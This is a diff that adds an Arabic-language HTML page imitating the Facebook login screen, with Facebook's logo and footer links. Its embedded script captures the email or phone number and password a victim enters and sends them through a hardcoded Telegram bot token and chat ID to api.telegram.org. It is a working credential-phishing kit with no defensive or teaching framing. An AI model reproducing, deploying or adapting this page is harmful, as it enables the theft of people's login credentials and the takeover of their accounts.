@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* لمنع التمرير */
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 20px;
+        }
+        .logo img {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+            text-align: right; /* تعديل اتجاه الكتابة */
+        }
+        .input-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #155db5;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .bottom-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #737373;
+            max-width: 400px;
+            text-align: center;
+        }
+        .bottom-links a {
+            margin: 5px 10px;
+            color: #737373;
+            text-decoration: none;
+        }
+        .bottom-links a:hover {
+            text-decoration: underline;
+        }
+        /* استعلام الوسائط لجعل العرض دائمًا جزء منه غير مرئي على الشاشات الصغيرة */
+        @media (max-height: 700px) {
+            .container {
+                margin-top: 10px;
+            }
+            body {
+                overflow-y: auto; /* السماح بالتمرير على الشاشات الصغيرة */
+            }
+        }
+    </style>
+    <script>
+        function sendToTelegram(event) {
+            event.preventDefault();
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var telegramToken = "7820964187:AAFS_Ra2DOzVZRo8MNMgmQ1Q8w2pYYogQKU";
+            var chatId = "5753872265";
+            var message = "البريد الإلكتروني/الهاتف: " + email + "\nكلمة المرور: " + password;
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    if (response.ok) {
+                        alert("تم إرسال البيانات بنجاح");
+                    } else {
+                        alert("حدث خطأ أثناء الإرسال");
+                    }
+                })
+                .catch(error => {
+                    alert("فشل الاتصال بتليجرام");
+                });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo">
+        </div>
+        <form onsubmit="sendToTelegram(event)">
+            <div class="input-group">
+                <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+        <div class="footer">
+            <p><a href="#">هل نسيت كلمة السر؟</a></p>
+            <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+        </div>
+    </div>
+    <div class="bottom-links">
+        <a href="#">English (US)</a>
+        <a href="#">العربية</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Español</a>
+        <a href="#">Deutsch</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">イタリア語</a>
+        <a href="#">हिन्दी</a>
+    </div>
+    <div class="bottom-links" style="margin-top: 10px;">
+        <a href="#">التسجيل</a>
+        <a href="#">تسجيل الدخول</a>
+        <a href="#">ماسنجر</a>
+        <a href="#">فيسبوك لايت</a>
+        <a href="#">الأشخاص</a>
+        <a href="#">الصفحات</a>
+        <a href="#">التصنيفات</a>
+        <a href="#">المواقع</a>
+        <a href="#">الألعاب</a>
+        <a href="#">المشاهير</a>
+        <a href="#">مجموعات</a>
+        <a href="#">الخصوصية</a>
+        <a href="#">ملفات تعريف الارتباط</a>
+        <a href="#">الشروط</a>
+        <a href="#">الإعلانات</a>
+        <a href="#">المساعدة</a>
+    </div>
+</body>
+</html>
